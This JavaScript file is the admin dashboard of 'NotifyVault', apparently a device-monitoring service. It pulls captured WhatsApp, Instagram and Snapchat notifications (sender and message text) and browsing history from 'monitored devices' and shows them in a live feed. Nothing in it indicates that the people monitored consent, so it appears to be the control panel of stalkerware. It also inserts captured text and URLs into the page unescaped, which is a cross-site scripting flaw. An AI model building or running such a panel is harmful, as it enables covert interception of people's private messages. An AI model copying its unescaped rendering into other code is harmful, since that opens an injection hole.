const state = { token: localStorage.getItem('nv_admin_token') || '', backend: 'https://notifyvault-theta.vercel.app' };
const el = (id) => document.getElementById(id);

const formatNumber = (value) => Number(value || 0).toLocaleString();
const formatDate = (value) => {
  if (!value) return '—';
  const date = new Date(value);
  if (Number.isNaN(date.getTime())) return '—';
  return new Intl.DateTimeFormat('en', { dateStyle: 'medium', timeStyle: 'short' }).format(date);
};

const getAppBadge = (pkg) => {
  const source = (pkg || '').toLowerCase();
  if (source.includes('whatsapp')) {
    return `<span class="app-badge whatsapp">WhatsApp</span>`;
  }
  if (source.includes('instagram')) {
    return `<span class="app-badge instagram">Instagram</span>`;
  }
  if (source.includes('snapchat')) {
    return `<span class="app-badge snapchat">Snapchat</span>`;
  }
  return `<span class="app-badge other">${pkg ? pkg.split('.').pop() : 'Web/App'}</span>`;
};

async function api(path, options = {}) {
  const response = await fetch(`${state.backend}${path}`, {
    ...options,
    headers: {
      'Content-Type': 'application/json',
      ...(state.token ? { Authorization: `Bearer ${state.token}` } : {}),
      ...(options.headers || {})
    }
  });
  const json = await response.json().catch(() => ({}));
  if (!response.ok) throw new Error(json.message || 'Request failed');
  return json;
}

function renderLogin() {
  document.getElementById('app').innerHTML = `
    <div class="container login-panel">
      <div class="card login-card">
        <div class="brand-node">N</div>
        <div class="eyebrow">Protected administration</div>
        <h1>NotifyVault Admin</h1>
        <p class="muted">Secure backend access only. No public admin signup.</p>
        <div class="login-grid">
          <div>
            <label>Email</label>
            <input id="adminEmail" type="email" placeholder="admin@notifyvault.local" />
          </div>
          <div>
            <label>Password</label>
            <input id="adminPassword" type="password" placeholder="Password" />
          </div>
          <button id="loginBtn">Sign in</button>
        </div>
      </div>
    </div>
  `;
  el('loginBtn').onclick = async () => {
    try {
      const email = el('adminEmail').value.trim();
      const password = el('adminPassword').value;
      const result = await api('/api/admin/login', {
        method: 'POST',
        body: JSON.stringify({ email, password })
      });
      state.token = result.token;
      localStorage.setItem('nv_admin_token', result.token);
      renderDashboard();
    } catch (error) {
      alert(error.message);
    }
  };
}

async function openDeviceModal(deviceId, deviceName, onlineStatus) {
  let modalEl = document.getElementById('deviceModal');
  if (!modalEl) {
    modalEl = document.createElement('div');
    modalEl.id = 'deviceModal';
    modalEl.className = 'modal-backdrop';
    document.body.appendChild(modalEl);
  }

  modalEl.style.display = 'flex';
  modalEl.innerHTML = `
    <div class="modal-card">
      <div class="modal-header">
        <div>
          <div class="eyebrow">Device Monitoring logs</div>
          <h2>${deviceName || deviceId}</h2>
          <div class="muted small">${deviceId} • <span class="status-pill ${onlineStatus ? 'online' : 'offline'}">${onlineStatus ? 'Online' : 'Offline'}</span></div>
        </div>
        <button class="close-btn" id="closeModalBtn">&times;</button>
      </div>

      <div class="tab-bar">
        <button class="tab-btn active" id="tabNotifications">📱 Notification History</button>
        <button class="tab-btn" id="tabHistory">🌐 Browse History</button>
      </div>

      <div id="modalTabContent" class="modal-content-body">
        <div class="loading-spinner">Loading device data...</div>
      </div>
    </div>
  `;

  document.getElementById('closeModalBtn').onclick = () => {
    modalEl.style.display = 'none';
  };

  const loadNotificationsTab = async () => {
    document.getElementById('tabNotifications').className = 'tab-btn active';
    document.getElementById('tabHistory').className = 'tab-btn';
    const content = document.getElementById('modalTabContent');
    content.innerHTML = `<div class="loading-spinner">Loading notification history...</div>`;
    try {
      const res = await api(`/api/admin/messages?deviceId=${encodeURIComponent(deviceId)}&limit=150`);
      const msgs = res.messages || [];
      if (!msgs.length) {
        content.innerHTML = `<div class="empty-notice">No notifications recorded for this device yet.</div>`;
        return;
      }
      content.innerHTML = `
        <div class="table-wrap">
          <table>
            <thead>
              <tr><th>App</th><th>Sender</th><th>Message Text</th><th>Captured Time</th></tr>
            </thead>
            <tbody>
              ${msgs.map(msg => `
                <tr>
                  <td>${getAppBadge(msg.sourcePackage || msg.sourceType)}</td>
                  <td><strong>${msg.sender || 'Unknown'}</strong></td>
                  <td>${msg.messageText || ''}</td>
                  <td>${formatDate(msg.capturedAt)}</td>
                </tr>
              `).join('')}
            </tbody>
          </table>
        </div>
      `;
    } catch (err) {
      content.innerHTML = `<div class="error-notice">Failed to load notifications: ${err.message}</div>`;
    }
  };

  const loadHistoryTab = async () => {
    document.getElementById('tabNotifications').className = 'tab-btn';
    document.getElementById('tabHistory').className = 'tab-btn active';
    const content = document.getElementById('modalTabContent');
    content.innerHTML = `<div class="loading-spinner">Loading browsing history...</div>`;
    try {
      const res = await api(`/api/admin/browser-history?deviceId=${encodeURIComponent(deviceId)}&limit=150`);
      const items = res.history || [];
      if (!items.length) {
        content.innerHTML = `<div class="empty-notice">No browsing history recorded for this device yet.</div>`;
        return;
      }
      content.innerHTML = `
        <div class="table-wrap">
          <table>
            <thead>
              <tr><th>Page Title</th><th>Visited URL</th><th>Visited Time</th></tr>
            </thead>
            <tbody>
              ${items.map(item => `
                <tr>
                  <td><strong>${item.title || 'Web Page'}</strong></td>
                  <td><a href="${item.url}" target="_blank" class="url-link">${item.url}</a></td>
                  <td>${formatDate(item.timestamp)}</td>
                </tr>
              `).join('')}
            </tbody>
          </table>
        </div>
      `;
    } catch (err) {
      content.innerHTML = `<div class="error-notice">Failed to load browsing history: ${err.message}</div>`;
    }
  };

  document.getElementById('tabNotifications').onclick = loadNotificationsTab;
  document.getElementById('tabHistory').onclick = loadHistoryTab;

  // Default load Notifications Tab
  loadNotificationsTab();
}

async function renderDashboard() {
  try {
    const [summary, devices, messages, browserHistory] = await Promise.all([
      api('/api/admin/dashboard'),
      api('/api/admin/devices'),
      api('/api/admin/messages?limit=100'),
      api('/api/admin/browser-history?limit=100').catch(() => ({ history: [] }))
    ]);

    const summaryCards = [
      { label: 'Total Devices', value: formatNumber(summary.totalRegisteredDevices || 0), tone: 'primary' },
      { label: 'Online Devices', value: formatNumber(summary.onlineDevices || 0), tone: 'success' },
      { label: 'Offline Devices', value: formatNumber(summary.offlineDevices || 0), tone: 'warning' },
      { label: 'Total Messages', value: formatNumber(summary.totalSynchronizedMessages || 0), tone: 'info' },
      { label: "Today's Messages", value: formatNumber(summary.todaysMessages || 0), tone: 'primary' }
    ];

    const renderTable = (rows) => rows.length ? rows : [{ empty: true }];

    document.getElementById('app').innerHTML = `
      <div class="container dashboard-shell">
        <header class="topbar">
          <div>
            <div class="eyebrow">Operations</div>
            <h1>NotifyVault Admin Dashboard</h1>
          </div>
          <button class="secondary" id="logoutBtn">Logout</button>
        </header>

        <section class="stats-grid">
          ${summaryCards.map(card => `
            <div class="card stat-card ${card.tone}">
              <div class="stat-label">${card.label}</div>
              <div class="stat-value">${card.value}</div>
            </div>
          `).join('')}
        </section>

        <section class="panel-grid">
          <div class="card panel-card">
            <div class="panel-header">
              <h2>Monitored Devices (Click Device to View Logs)</h2>
              <span class="chip neutral">${(devices.devices || []).length} registered</span>
            </div>
            <div class="table-wrap">
              <table>
                <thead>
                  <tr><th>Device Name</th><th>Online</th><th>Last Seen</th><th>Last Sync</th><th>Action</th></tr>
                </thead>
                <tbody>
                  ${(renderTable(devices.devices || [])).map(device => device.empty ? '<tr><td colspan="5">No devices registered</td></tr>' : `
                    <tr class="clickable-row" data-device-id="${device.deviceId}" data-device-name="${device.deviceName || device.deviceId}" data-online="${device.online}">
                      <td><strong>${device.deviceName || device.deviceId}</strong></td>
                      <td><span class="status-pill ${device.online ? 'online' : 'offline'}">${device.online ? 'Online' : 'Offline'}</span></td>
                      <td>${formatDate(device.lastSeen)}</td>
                      <td>${formatDate(device.lastSync)}</td>
                      <td><button class="action-btn">View Logs</button></td>
                    </tr>
                  `).join('')}
                </tbody>
              </table>
            </div>
          </div>

          <div class="card panel-card">
            <div class="panel-header">
              <h2>Device Browsing History (Global Feed)</h2>
              <span class="chip primary">${(browserHistory.history || []).length} URLs</span>
            </div>
            <div class="table-wrap">
              <table>
                <thead>
                  <tr><th>Device Name</th><th>Page Title</th><th>Visited URL</th><th>Visited Time</th></tr>
                </thead>
                <tbody>
                  ${(renderTable(browserHistory.history || [])).map(item => item.empty ? '<tr><td colspan="4">No browsing history recorded yet</td></tr>' : `
                    <tr>
                      <td><strong>${item.deviceName || item.deviceId || 'Device'}</strong></td>
                      <td>${item.title || 'Web Page'}</td>
                      <td><a href="${item.url}" target="_blank" class="url-link">${item.url}</a></td>
                      <td>${formatDate(item.timestamp)}</td>
                    </tr>
                  `).join('')}
                </tbody>
              </table>
            </div>
          </div>

          <div class="card panel-card">
            <div class="panel-header">
              <h2>Synchronized Messages & Web Notifications (Global Feed)</h2>
              <span class="chip info">${(messages.messages || []).length} captured</span>
            </div>
            <div class="table-wrap">
              <table>
                <thead>
                  <tr><th>App</th><th>Device Name</th><th>Sender</th><th>Message Text</th><th>Captured Time</th></tr>
                </thead>
                <tbody>
                  ${(renderTable(messages.messages || [])).map(msg => msg.empty ? '<tr><td colspan="5">No messages captured yet</td></tr>' : `
                    <tr>
                      <td>${getAppBadge(msg.sourcePackage || msg.sourceType)}</td>
                      <td><strong>${msg.deviceName || msg.deviceId || 'Device'}</strong></td>
                      <td>${msg.sender || 'Unknown'}</td>
                      <td>${(msg.messageText || '').slice(0, 100)}</td>
                      <td>${formatDate(msg.capturedAt)}</td>
                    </tr>
                  `).join('')}
                </tbody>
              </table>
            </div>
          </div>
        </section>
      </div>
    `;

    // Bind Device Row Click Listeners
    document.querySelectorAll('.clickable-row').forEach((row) => {
      row.onclick = () => {
        const id = row.getAttribute('data-device-id');
        const name = row.getAttribute('data-device-name');
        const online = row.getAttribute('data-online') === 'true';
        openDeviceModal(id, name, online);
      };
    });

    const source = new EventSource(`${state.backend}/api/admin/stream`, { withCredentials: true });
    source.onmessage = async (event) => {
      const data = JSON.parse(event.data || '{}');
      if (data.type === 'new_message' || data.type === 'new_history') {
        try {
          const [refreshedMsgs, refreshedHistory] = await Promise.all([
            api('/api/admin/messages?limit=100'),
            api('/api/admin/browser-history?limit=100').catch(() => ({ history: [] }))
          ]);
          const tables = document.querySelectorAll('table');
          if (tables.length > 2) {
            // Update History Table
            tables[1].tBodies[0].innerHTML = (refreshedHistory.history || []).map(item => `
              <tr>
                <td><strong>${item.deviceName || item.deviceId || 'Device'}</strong></td>
                <td>${item.title || 'Web Page'}</td>
                <td><a href="${item.url}" target="_blank" class="url-link">${item.url}</a></td>
                <td>${formatDate(item.timestamp)}</td>
              </tr>
            `).join('') || '<tr><td colspan="4">No browsing history recorded yet</td></tr>';

            // Update Messages Table
            tables[2].tBodies[0].innerHTML = (refreshedMsgs.messages || []).map(msg => `
              <tr>
                <td>${getAppBadge(msg.sourcePackage || msg.sourceType)}</td>
                <td><strong>${msg.deviceName || msg.deviceId || 'Device'}</strong></td>
                <td>${msg.sender || 'Unknown'}</td>
                <td>${(msg.messageText || '').slice(0, 100)}</td>
                <td>${formatDate(msg.capturedAt)}</td>
              </tr>
            `).join('') || '<tr><td colspan="5">No messages captured yet</td></tr>';
          }
        } catch (_) {}
      }
    };
    source.onerror = () => source.close();

    el('logoutBtn').onclick = () => {
      state.token = '';
      localStorage.removeItem('nv_admin_token');
      renderLogin();
    };
  } catch (error) {
    state.token = '';
    localStorage.removeItem('nv_admin_token');
    renderLogin();
  }
}

if (state.token) {
  renderDashboard();
} else {
  renderLogin();
}
